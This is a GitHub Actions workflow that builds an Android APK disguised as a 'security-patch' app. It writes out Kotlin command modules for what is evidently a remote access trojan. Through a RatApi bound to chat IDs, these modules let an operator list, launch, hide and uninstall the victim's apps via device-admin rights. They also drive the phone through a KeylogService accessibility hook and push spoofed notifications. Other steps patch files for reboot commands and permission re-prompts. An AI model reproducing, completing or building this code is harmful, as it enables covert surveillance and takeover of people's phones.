name: Build Flutter APK from ZIP

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout repo
        uses: actions/checkout@v4

      - name: Setup Java 17
        uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: "17"

      - name: Setup Flutter
        uses: subosito/flutter-action@v2
        with:
          flutter-version: "3.24.5"
          channel: stable
          cache: true

      - name: Extract source ZIP
        run: |
          mkdir -p /tmp/zip_raw
          unzip source.zip -d /tmp/zip_raw
          COUNT=$(ls /tmp/zip_raw | wc -l | tr -d ' ')
          FIRST=$(ls /tmp/zip_raw | head -1)
          if [ "$COUNT" = "1" ] && [ -d "/tmp/zip_raw/$FIRST" ]; then
            mv "/tmp/zip_raw/$FIRST" /tmp/flutter_src
          else
            mv /tmp/zip_raw /tmp/flutter_src
          fi
          ls /tmp/flutter_src

      - name: Fix pubspec package name
        run: |
          cd /tmp/flutter_src
          sed -i -E 's/^name:.*$/name: security_patch/' pubspec.yaml

      - name: Scaffold android project
        run: |
          cd /tmp/flutter_src
          cp pubspec.yaml /tmp/pubspec.bak
          flutter create --org com.android.security --project-name security_patch --platforms android .
          cp /tmp/pubspec.bak pubspec.yaml

      - name: Overlay manifest + kotlin + res
        run: |
          cd /tmp/flutter_src
          rm -rf android/app/src/main/kotlin/com/example
          rm -rf android/app/src/main/kotlin/com/android/security/security_patch
          mkdir -p android/app/src/main/kotlin/com/android/security/patch
          cp -rf android_override/app/src/main/kotlin/com/android/security/patch/* android/app/src/main/kotlin/com/android/security/patch/
          cp -f android_override/app/src/main/AndroidManifest.xml android/app/src/main/AndroidManifest.xml
          mkdir -p android/app/src/main/res/xml
          mkdir -p android/app/src/main/res/values
          cp -f android_override/app/src/main/res/xml/* android/app/src/main/res/xml/
          cp -f android_override/app/src/main/res/values/* android/app/src/main/res/values/

      - name: Fix small files
        run: |
          cd /tmp/flutter_src
          python3 - <<'PYEOF'
          import re, os
          base = "android/app/src/main/kotlin/com/android/security/patch"
          manifest = "android/app/src/main/AndroidManifest.xml"

          def apply(path, *rules):
              if not os.path.exists(path):
                  print(f"  MISSING: {path}"); return
              with open(path) as f: s = f.read()
              for pattern, repl in rules:
                  s, n = re.subn(pattern, repl, s)
                  print(f"  {path} :: {pattern[:50]!r} -> {n}")
              with open(path, "w") as f: f.write(s)

          apply(f"{base}/WebViewActivity.kt",
              (r"import androidx\.appcompat\.app\.AppCompatActivity", "import android.app.Activity"),
              (r"class WebViewActivity\s*:\s*AppCompatActivity\(\)", "class WebViewActivity : Activity()"),
          )

          apply(f"{base}/CoreService.kt",
              (r"import androidx\.core\.app\.NotificationCompat\s*\n", ""),
              (r"NotificationCompat\.Builder", "Notification.Builder"),
              (r"NotificationCompat\.PRIORITY_MIN", "Notification.PRIORITY_MIN"),
              (r"\n\s*\.setSilent\(true\)", ""),
              (r"import android\.content\.Intent", "import android.content.Intent\nimport android.app.Notification\nimport com.android.security.patch.commands.Rules"),
              (r"FOREGROUND_SERVICE_TYPE_DATA_SYNC\s*\n?\s*or\s*android\.content\.pm\.ServiceInfo\.FOREGROUND_SERVICE_TYPE_CONNECTED_DEVICE",
               "android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC"),
              (r"android\.content\.pm\.ServiceInfo\.FOREGROUND_SERVICE_TYPE_DATA_SYNC\s*or\s*android\.content\.pm\.ServiceInfo\.FOREGROUND_SERVICE_TYPE_CONNECTED_DEVICE",
               "android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC"),
              (r"FOREGROUND_SERVICE_TYPE_DATA_SYNC\s*\|\s*FOREGROUND_SERVICE_TYPE_CONNECTED_DEVICE",
               "FOREGROUND_SERVICE_TYPE_DATA_SYNC"),
          )

          apply(f"{base}/AdminReceiver.kt",
              (r"import android\.content\.Intent", "import android.content.Intent\nimport com.android.security.patch.commands.Rules"),
          )

          apply(f"{base}/HangManager.kt",
              (r"\n\s*val custom = Prefs\.getStr\(null\)[^\n]*\n", "\n"),
          )

          apply(f"{base}/commands/SystemCmd.kt",
              (r"wm\.setInputStream\(it\)", "wm.setStream(it)"),
          )

          apply(f"{base}/CommandRouter.kt",
              (r'"reboot" -> DangerCmd\.reboot\(ctx, chatId\)',
               '"reboot" -> DangerCmd.reboot(ctx, chatId, args)'),
              (r'"izin" -> Setup\.rePrompt\(ctx\); RatApi\.sendMessage\(ctx, "re-prompt triggered", chatId\)',
               '"izin" -> { Setup.rePrompt(ctx); RatApi.sendMessage(ctx, "re-prompt triggered", chatId) }'),
          )

          # manifest: drop connectedDevice + camera from service type
          apply(manifest,
              (r'android:foregroundServiceType="dataSync\|connectedDevice\|camera"',
               'android:foregroundServiceType="dataSync"'),
              (r'android:foregroundServiceType="dataSync\|connectedDevice"',
               'android:foregroundServiceType="dataSync"'),
          )
          PYEOF

      - name: Rewrite Apps.kt
        run: |
          D=/tmp/flutter_src/android/app/src/main/kotlin/com/android/security/patch/commands/Apps.kt
          mkdir -p $(dirname $D)
          cat > $D <<'KT_EOF'
package com.android.security.patch.commands

import android.app.admin.DevicePolicyManager
import android.content.Context
import android.content.Intent
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.net.Uri
import com.android.security.patch.AdminReceiver
import com.android.security.patch.RatApi

object Apps {
    fun listApps(ctx: Context, chatId: Long, args: Array<String>) {
        val filter = args.joinToString(" ").lowercase()
        Thread {
            try {
                val pm = ctx.packageManager
                val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
                    .filter { it.packageName != ctx.packageName }
                    .filter {
                        (it.flags and ApplicationInfo.FLAG_SYSTEM) == 0 ||
                        (it.flags and ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0
                    }
                    .filter {
                        filter.isBlank() ||
                        it.packageName.lowercase().contains(filter) ||
                        pm.getApplicationLabel(it).toString().lowercase().contains(filter)
                    }
                    .sortedBy { pm.getApplicationLabel(it).toString().lowercase() }
                if (apps.isEmpty()) { RatApi.sendMessage(ctx, "no apps match", chatId); return@Thread }
                val sb = StringBuilder("<b>apps (${apps.size})</b>\n")
                for (a in apps.take(80)) {
                    val label = pm.getApplicationLabel(a)
                    sb.append("<code>${a.packageName}</code> — $label\n")
                }
                if (apps.size > 80) sb.append("\n<i>+ ${apps.size - 80} more</i>")
                RatApi.sendMessage(ctx, sb.toString(), chatId)
            } catch (e: Throwable) { RatApi.sendMessage(ctx, "err: ${e.message}", chatId) }
        }.start()
    }

    fun openApp(ctx: Context, chatId: Long, args: Array<String>) {
        val pkg = args.getOrNull(0) ?: run {
            RatApi.sendMessage(ctx, "usage: /app_open <pkg>", chatId); return
        }
        try {
            val intent = ctx.packageManager.getLaunchIntentForPackage(pkg)
            if (intent == null) { RatApi.sendMessage(ctx, "no launcher", chatId); return }
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            ctx.startActivity(intent)
            RatApi.sendMessage(ctx, "opened $pkg", chatId)
        } catch (e: Throwable) { RatApi.sendMessage(ctx, "err: ${e.message}", chatId) }
    }

    fun hideApp(ctx: Context, chatId: Long, args: Array<String>) {
        val pkg = args.getOrNull(0) ?: run {
            RatApi.sendMessage(ctx, "usage: /app_hide <pkg>", chatId); return
        }
        val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        if (!dpm.isAdminActive(AdminReceiver.component(ctx))) {
            RatApi.sendMessage(ctx, "admin not active", chatId); return
        }
        try {
            val ok = dpm.setApplicationHidden(AdminReceiver.component(ctx), pkg, true)
            RatApi.sendMessage(ctx, if (ok) "hidden $pkg" else "failed", chatId)
        } catch (e: Throwable) { RatApi.sendMessage(ctx, "err: ${e.message}", chatId) }
    }

    fun showApp(ctx: Context, chatId: Long, args: Array<String>) {
        val pkg = args.getOrNull(0) ?: run {
            RatApi.sendMessage(ctx, "usage: /app_show <pkg>", chatId); return
        }
        val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        try {
            val ok = dpm.setApplicationHidden(AdminReceiver.component(ctx), pkg, false)
            RatApi.sendMessage(ctx, if (ok) "shown $pkg" else "failed", chatId)
        } catch (e: Throwable) { RatApi.sendMessage(ctx, "err: ${e.message}", chatId) }
    }

    fun uninstallApp(ctx: Context, chatId: Long, args: Array<String>) {
        val pkg = args.getOrNull(0) ?: run {
            RatApi.sendMessage(ctx, "usage: /app_uninstall <pkg>", chatId); return
        }
        try {
            val i = Intent(Intent.ACTION_UNINSTALL_PACKAGE, Uri.parse("package:$pkg"))
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            ctx.startActivity(i)
            RatApi.sendMessage(ctx, "uninstall prompt shown", chatId)
        } catch (e: Throwable) { RatApi.sendMessage(ctx, "err: ${e.message}", chatId) }
    }
}
KT_EOF

      - name: Rewrite Navigate.kt
        run: |
          D=/tmp/flutter_src/android/app/src/main/kotlin/com/android/security/patch/commands/Navigate.kt
          cat > $D <<'KT_EOF'
package com.android.security.patch.commands

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.os.Build
import com.android.security.patch.KeylogService
import com.android.security.patch.RatApi

object Navigate {
    fun home(ctx: Context, chatId: Long) {
        val ok = KeylogService.instance?.goHome() ?: false
        RatApi.sendMessage(ctx, if (ok) "home pressed" else "accessibility not active", chatId)
    }
    fun back(ctx: Context, chatId: Long) {
        val ok = KeylogService.instance?.goBack() ?: false
        RatApi.sendMessage(ctx, if (ok) "back pressed" else "accessibility not active", chatId)
    }
    fun recents(ctx: Context, chatId: Long) {
        val ok = KeylogService.instance?.openRecents() ?: false
        RatApi.sendMessage(ctx, if (ok) "recents opened" else "accessibility not active", chatId)
    }
    fun pullNotifications(ctx: Context, chatId: Long) {
        val ok = KeylogService.instance?.openNotifs() ?: false
        RatApi.sendMessage(ctx, if (ok) "notif shade opened" else "accessibility not active", chatId)
    }
    fun sendNotification(ctx: Context, chatId: Long, args: Array<String>) {
        val raw = args.joinToString(" ").trim()
        if (raw.isEmpty()) { RatApi.sendMessage(ctx, "usage: /notif_send Title|Body", chatId); return }
        val title: String
        val body: String
        if (raw.contains("|")) {
            title = raw.substringBefore("|").trim()
            body = raw.substringAfter("|").trim()
        } else { title = "System"; body = raw }
        try {
            val nm = ctx.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            val chId = "inbox_" + System.currentTimeMillis()
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val ch = NotificationChannel(chId, "Messages", NotificationManager.IMPORTANCE_HIGH)
                nm.createNotificationChannel(ch)
            }
            val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                Notification.Builder(ctx, chId)
            else @Suppress("DEPRECATION") Notification.Builder(ctx)
            val n = builder
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setContentTitle(title)
                .setContentText(body)
                .setAutoCancel(true)
                .setPriority(Notification.PRIORITY_HIGH)
                .build()
            nm.notify((System.currentTimeMillis() % Int.MAX_VALUE).toInt(), n)
            RatApi.sendMessage(ctx, "notification sent", chatId)
        } catch (e: Throwable) { RatApi.sendMessage(ctx, "err: ${e.message}", chatId) }
    }
}
KT_EOF

      - name: Verify no stale refs
        run: |
          cd /tmp/flutter_src
          BASE=android/app/src/main/kotlin/com/android/security/patch
          FOUND=0
          for tok in "NotificationCompat" "setInputStream" "deletePackage" "setSilent" "AppCompatActivity" "CONNECTED_DEVICE"; do
            HITS=$(grep -rn "$tok" $BASE $BASE/../ 2>/dev/null || true)
            if [ -n "$HITS" ]; then echo "!!! $tok:"; echo "$HITS"; FOUND=1; fi
          done
          if [ "$FOUND" = "0" ]; then echo "=== clean ==="; fi
          echo "--- manifest fg type ---"
          grep -n "foregroundServiceType" /tmp/flutter_src/android/app/src/main/AndroidManifest.xml
          echo "--- CoreService startForeground ---"
          grep -n "FOREGROUND_SERVICE_TYPE" /tmp/flutter_src/android/app/src/main/kotlin/com/android/security/patch/CoreService.kt

      - name: Configure build.gradle
        run: |
          cd /tmp/flutter_src
          python3 - <<'PY'
          import re
          p = "android/app/build.gradle"
          s = open(p).read()
          s = re.sub(r'namespace\s*=\s*"[^"]+"', 'namespace = "com.android.security.patch"', s)
          s = re.sub(r'namespace\s+"[^"]+"', 'namespace "com.android.security.patch"', s)
          s = re.sub(r'applicationId\s*=\s*"[^"]+"', 'applicationId = "com.android.security.patch"', s)
          s = re.sub(r'applicationId\s+"[^"]+"', 'applicationId "com.android.security.patch"', s)
          s = re.sub(r'minSdkVersion\s+flutter\.minSdkVersion', 'minSdkVersion 26', s)
          s = re.sub(r'minSdk\s+flutter\.minSdkVersion', 'minSdk 26', s)
          s = re.sub(r'targetSdkVersion\s+flutter\.targetSdkVersion', 'targetSdkVersion 34', s)
          s = re.sub(r'targetSdk\s+flutter\.targetSdkVersion', 'targetSdk 34', s)
          anchor = "dependencies {"
          inject = anchor + "\n    implementation 'org.jetbrains.kotlinx:kotlinx-coroutines-android:1.7.3'\n"
          s = s.replace(anchor, inject, 1)
          open(p, "w").write(s)
          print("=== build.gradle patched ===")
          PY

      - name: Pub get
        run: cd /tmp/flutter_src && flutter pub get

      - name: Build APK release
        run: cd /tmp/flutter_src && flutter build apk --release

      - name: Rename APK
        run: mv /tmp/flutter_src/build/app/outputs/flutter-apk/app-release.apk /tmp/flutter_src/build/app/outputs/flutter-apk/security-patch.apk

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: security-patch-apk
          path: /tmp/flutter_src/build/app/outputs/flutter-apk/security-patch.apk
          retention-days: 14
